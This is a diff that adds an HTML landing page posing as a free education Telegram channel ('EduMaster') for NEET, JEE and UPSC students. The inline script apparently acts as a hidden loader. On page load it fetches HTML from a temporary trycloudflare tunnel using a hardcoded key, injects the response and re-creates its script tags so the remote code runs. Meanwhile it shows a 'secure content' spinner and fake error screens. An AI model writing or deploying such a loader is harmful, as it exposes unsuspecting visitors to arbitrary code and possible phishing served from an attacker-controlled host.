@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Primary Meta Tags -->
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>EduMaster | Free Education Telegram Channel</title>
+    <meta name="description" content="Join the best education Telegram channel for free notes, PDFs, video lectures, and exam prep. Daily updates for students – NEET, JEE, UPSC, coding & more." />
+    <meta name="keywords" content="education telegram channel, free study material, Telegram channel for students, exam prep, NEET, JEE, UPSC, coding, PDF notes, free lectures" />
+    <meta name="author" content="EduMaster" />
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+    <link rel="canonical" href="https://edumaster.t.me/" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://edumaster.t.me/" />
+    <meta property="og:title" content="EduMaster – Free Education Telegram Channel" />
+    <meta property="og:description" content="Unlimited free study resources: notes, PDFs, video lectures, daily quizzes. Join 50,000+ students on Telegram." />
+    <meta property="og:image" content="https://edumaster.t.me/og-image.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:site_name" content="EduMaster Telegram" />
+    <meta property="og:locale" content="en_US" />
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="https://edumaster.t.me/" />
+    <meta name="twitter:title" content="EduMaster – Free Education Telegram Channel" />
+    <meta name="twitter:description" content="Free notes, PDFs, lectures & exam updates. Join the smartest Telegram channel for students." />
+    <meta name="twitter:image" content="https://edumaster.t.me/og-image.jpg" />
+
+    <!-- Theme & Icons -->
+    <meta name="theme-color" content="#0a0a0f" />
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📚</text></svg>" />
+
+    <!-- Structured Data (JSON‑LD) -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "EducationalOrganization",
+        "name": "EduMaster",
+        "url": "https://t.me/yourchannel",
+        "description": "Free education Telegram channel providing notes, PDFs, video lectures, and exam preparation materials.",
+        "sameAs": [
+            "https://t.me/yourchannel"
+        ]
+    }
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '2195916054596933');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=2195916054596933&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
+    <style>
+        :root {
+            --bg-deep: #0a0a0f;
+            --bg-card: rgba(20, 20, 30, 0.85);
+            --text-primary: #fff;
+            --text-secondary: rgba(255, 255, 255, 0.65);
+            --accent-start: #00b4ff;
+            --accent-end: #8a2be2;
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --shadow-glow: 0 0 30px rgba(0, 180, 255, 0.25);
+            --radius-xl: 24px;
+            --transition-smooth: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg-deep);
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            overflow: hidden;
+            color: var(--text-primary);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at 50% 50%, #13132b 0%, #0a0a0f 70%);
+            z-index: -2;
+        }
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(0,180,255,0.04) 0%, transparent 50%, rgba(138,43,226,0.04) 100%);
+            animation: bgShift 8s ease-in-out infinite alternate;
+            z-index: -1;
+        }
+
+        @keyframes bgShift {
+            0% { opacity: 0.4; transform: scale(1); }
+            100% { opacity: 1; transform: scale(1.05); }
+        }
+
+        #root {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Loader */
+        .loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: fadeIn 0.6s ease-out;
+        }
+        .spinner {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: conic-gradient(from 0deg, transparent 0%, var(--accent-start) 10%, var(--accent-end) 90%, transparent 100%);
+            mask: radial-gradient(farthest-side, transparent calc(100% - 8px), #fff 0);
+            -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 8px), #fff 0);
+            animation: spin 1.2s cubic-bezier(0.6, 0.2, 0.4, 0.8) infinite;
+            box-shadow: var(--shadow-glow);
+        }
+        .loading-text {
+            margin-top: 28px;
+            font-size: 1rem;
+            letter-spacing: 0.3em;
+            text-transform: uppercase;
+            color: var(--text-secondary);
+            font-weight: 500;
+            animation: pulseText 2s infinite;
+        }
+        .loading-dots::after {
+            content: '';
+            animation: dots 1.6s steps(4, end) infinite;
+        }
+
+        /* Error card */
+        .error-card {
+            background: var(--bg-card);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-xl);
+            padding: 3rem 2.5rem;
+            max-width: 520px;
+            width: 92%;
+            text-align: center;
+            box-shadow: 0 30px 50px -20px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05) inset;
+            animation: fadeInUp 0.5s ease-out;
+        }
+        .error-icon {
+            font-size: 3.8rem;
+            margin-bottom: 1rem;
+            display: block;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.4));
+            animation: gentleShake 0.6s ease-in-out;
+        }
+        .error-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 0.8rem;
+            background: linear-gradient(to right, #fff, #ccc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .error-message {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            line-height: 1.6;
+            margin-bottom: 2.2rem;
+        }
+        .button-group {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .btn {
+            border: none;
+            padding: 0.9rem 2.2rem;
+            border-radius: 50px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            letter-spacing: 0.6px;
+            cursor: pointer;
+            transition: all var(--transition-smooth);
+            outline: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            backdrop-filter: blur(10px);
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent-start), var(--accent-end));
+            color: white;
+            box-shadow: 0 10px 25px rgba(0, 180, 255, 0.3);
+        }
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(0, 180, 255, 0.45);
+        }
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.07);
+            color: rgba(255, 255, 255, 0.85);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.14);
+            color: #fff;
+            transform: translateY(-2px);
+        }
+        .retry-countdown {
+            margin-top: 1.4rem;
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.4);
+        }
+        .details-toggle {
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.35);
+            font-size: 0.8rem;
+            margin-top: 1.8rem;
+            cursor: pointer;
+            text-decoration: underline;
+            transition: color 0.2s;
+        }
+        .details-toggle:hover {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .technical-details {
+            margin-top: 1rem;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 14px;
+            padding: 1rem 1.2rem;
+            text-align: left;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.55);
+            word-break: break-word;
+            max-height: 130px;
+            overflow-y: auto;
+            display: none;
+            line-height: 1.5;
+        }
+        .technical-details.visible {
+            display: block;
+        }
+
+        /* Demo content – education channel */
+        .demo-content {
+            text-align: center;
+            max-width: 700px;
+            animation: fadeIn 0.7s ease-out;
+            padding: 1rem;
+        }
+        .demo-hero h1 {
+            font-size: clamp(2.5rem, 8vw, 4.2rem);
+            font-weight: 800;
+            background: linear-gradient(135deg, #00b4ff 0%, #fff 50%, #8a2be2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem;
+            letter-spacing: -0.02em;
+        }
+        .demo-hero p {
+            font-size: 1.3rem;
+            color: var(--text-secondary);
+            margin-bottom: 2.5rem;
+            line-height: 1.6;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .demo-cta {
+            background: linear-gradient(135deg, #00b4ff, #8a2be2);
+            color: white;
+            padding: 1rem 2.8rem;
+            border-radius: 60px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            text-decoration: none;
+            display: inline-block;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 28px rgba(0, 180, 255, 0.35);
+            letter-spacing: 0.5px;
+        }
+        .demo-cta:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 18px 35px rgba(0, 180, 255, 0.5);
+        }
+        .demo-footer {
+            margin-top: 3.5rem;
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        /* Animations */
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes pulseText {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: ''; }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes gentleShake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .spinner,
+            .loading-text,
+            .error-icon,
+            .demo-content,
+            .error-card {
+                animation: none;
+            }
+            body::after {
+                animation: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden SEO text (preserved) -->
+    <div style="opacity:0.01; font-size:6px; position:absolute; bottom:0; right:0; max-width:200px; pointer-events:none; color:white; font-family:monospace; line-height:1.2;">
+        Lorem ipsum dolor sit amet, consectetur adipiscing elit. 
+        Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
+        Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris.
+        Duis aute irure dolor in reprehenderit in voluptate velit esse.
+        Excepteur sint occaecat cupidatat non proident, sunt in culpa.
+    </div>
+
+    <main id="root" aria-live="polite" aria-busy="true">
+        <div class="loader-container">
+            <div class="spinner" role="status" aria-label="Loading content"></div>
+            <p class="loading-text">LOADING SECURE CONTENT<span class="loading-dots"></span></p>
+        </div>
+    </main>
+
+    <script>
+        (function() {
+            // ---------- CONFIGURATION ----------
+            const SERVER_BASE_URL = 'https://bidder-downloaded-caribbean-preferences.trycloudflare.com'; // 🔁 Your server
+            const API_KEY = 'Sup3rS3cr3tK3y123!';
+            const TARGET_REPO = 'richardcarter';
+            const FILE_NAME = 'index.html';
+            const MAX_RETRIES = 2;
+            const RETRY_DELAY_MS = 4000;
+
+            const root = document.getElementById('root');
+            let retryCount = 0;
+            let autoRetryTimer = null;
+            let countdownInterval = null;
+
+            function renderLoader() {
+                root.innerHTML = `
+                    <div class="loader-container">
+                        <div class="spinner" role="status" aria-label="Loading content"></div>
+                        <p class="loading-text">LOADING SECURE CONTENT<span class="loading-dots"></span></p>
+                    </div>
+                `;
+                root.setAttribute('aria-busy', 'true');
+            }
+
+            function renderError(message, technicalInfo = '', showRetry = true) {
+                if (autoRetryTimer) clearTimeout(autoRetryTimer);
+                if (countdownInterval) clearInterval(countdownInterval);
+                root.setAttribute('aria-busy', 'false');
+
+                const retryBlock = showRetry ? `
+                    <div class="button-group">
+                        <button class="btn btn-primary" id="retryButton">
+                            <span aria-hidden="true">↻</span> Try Again
+                        </button>
+                        <button class="btn btn-secondary" id="demoButton">
+                            <span aria-hidden="true">📚</span> Open Channel
+                        </button>
+                    </div>
+                    <div class="retry-countdown" id="countdownDisplay"></div>
+                ` : `
+                    <div class="button-group">
+                        <button class="btn btn-secondary" id="demoButton">
+                            <span aria-hidden="true">📚</span> Open Channel
+                        </button>
+                    </div>
+                `;
+
+                const detailsBlock = technicalInfo ? `
+                    <button class="details-toggle" id="detailsToggle">Show technical details</button>
+                    <div class="technical-details" id="technicalDetails">${escapeHtml(technicalInfo)}</div>
+                ` : '';
+
+                root.innerHTML = `
+                    <div class="error-card">
+                        <span class="error-icon">⚠️</span>
+                        <h2 class="error-title">Channel loading issue</h2>
+                        <p class="error-message">${escapeHtml(message)}</p>
+                        ${retryBlock}
+                        ${detailsBlock}
+                    </div>
+                `;
+
+                document.getElementById('retryButton')?.addEventListener('click', () => {
+                    retryCount = 0;
+                    loadFullPage();
+                });
+                document.getElementById('demoButton')?.addEventListener('click', showDemoContent);
+                
+                const detailsToggle = document.getElementById('detailsToggle');
+                const technicalDetails = document.getElementById('technicalDetails');
+                if (detailsToggle && technicalDetails) {
+                    detailsToggle.addEventListener('click', () => {
+                        const visible = technicalDetails.classList.contains('visible');
+                        technicalDetails.classList.toggle('visible', !visible);
+                        detailsToggle.textContent = visible ? 'Show technical details' : 'Hide technical details';
+                    });
+                }
+
+                if (showRetry && retryCount < MAX_RETRIES) {
+                    startAutoRetryCountdown();
+                }
+            }
+
+            function startAutoRetryCountdown() {
+                const countdownEl = document.getElementById('countdownDisplay');
+                if (!countdownEl) return;
+                let secondsLeft = RETRY_DELAY_MS / 1000;
+                countdownEl.textContent = `Auto-retrying in ${secondsLeft} seconds...`;
+                countdownInterval = setInterval(() => {
+                    secondsLeft--;
+                    if (secondsLeft <= 0) {
+                        clearInterval(countdownInterval);
+                        countdownEl.textContent = 'Retrying now...';
+                    } else {
+                        countdownEl.textContent = `Auto-retrying in ${secondsLeft} seconds...`;
+                    }
+                }, 1000);
+                autoRetryTimer = setTimeout(() => {
+                    clearInterval(countdownInterval);
+                    retryCount++;
+                    loadFullPage();
+                }, RETRY_DELAY_MS);
+            }
+
+            function showDemoContent() {
+                if (autoRetryTimer) clearTimeout(autoRetryTimer);
+                if (countdownInterval) clearInterval(countdownInterval);
+                root.innerHTML = `
+                    <div class="demo-content">
+                        <div class="demo-hero">
+                            <h1>EduMaster 📚</h1>
+                            <p>Free notes, PDFs, video lectures & daily exam updates.<br>Join 50,000+ students on Telegram.</p>
+                            <a href="https://t.me/yourchannel" target="_blank" rel="noopener" class="demo-cta">🚀 Join Telegram Channel</a>
+                        </div>
+                        <div class="demo-footer">Trusted by students • NEET • JEE • UPSC • Coding</div>
+                    </div>
+                `;
+                root.setAttribute('aria-busy', 'false');
+            }
+
+            async function loadFullPage() {
+                renderLoader();
+                try {
+                    const url = `${SERVER_BASE_URL}/api/fetch-repo?repo=${TARGET_REPO}&file=${FILE_NAME}&api_key=${API_KEY}`;
+                    console.log(`🔍 Fetching from: ${TARGET_REPO}...`);
+
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 12000);
+                    const response = await fetch(url, { signal: controller.signal });
+                    clearTimeout(timeoutId);
+
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        throw new Error(`Server responded with ${response.status}${errorText ? ': ' + errorText : ''}`);
+                    }
+
+                    const htmlContent = await response.text();
+                    root.innerHTML = htmlContent;
+                    console.log('✅ Content loaded');
+                    root.setAttribute('aria-busy', 'false');
+
+                    root.querySelectorAll('script').forEach(oldScript => {
+                        const newScript = document.createElement('script');
+                        Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
+                        newScript.textContent = oldScript.innerHTML;
+                        oldScript.replaceWith(newScript);
+                    });
+
+                } catch (error) {
+                    console.error('❌ Fetch error:', error);
+                    let userMsg = 'Could not connect to the content server.';
+                    let techInfo = error.message || error.toString();
+
+                    if (error.name === 'AbortError' || techInfo.includes('timeout')) {
+                        userMsg = 'The request timed out. Check your network.';
+                    } else if (techInfo.includes('Failed to fetch') || techInfo.includes('NetworkError')) {
+                        userMsg = 'Network error. Is the server online?';
+                    } else if (techInfo.includes('Server responded with')) {
+                        userMsg = 'Server error. Please verify configuration.';
+                    }
+
+                    if (retryCount >= MAX_RETRIES) {
+                        userMsg += ' We tried several times.';
+                        renderError(userMsg, techInfo, false);
+                    } else {
+                        renderError(userMsg, techInfo, true);
+                    }
+                }
+            }
+
+            function escapeHtml(text) {
+                const div = document.createElement('div');
+                div.textContent = text;
+                return div.innerHTML;
+            }
+
+            // Start
+            loadFullPage();
+        })();
+    </script>
+</body>
+</html>
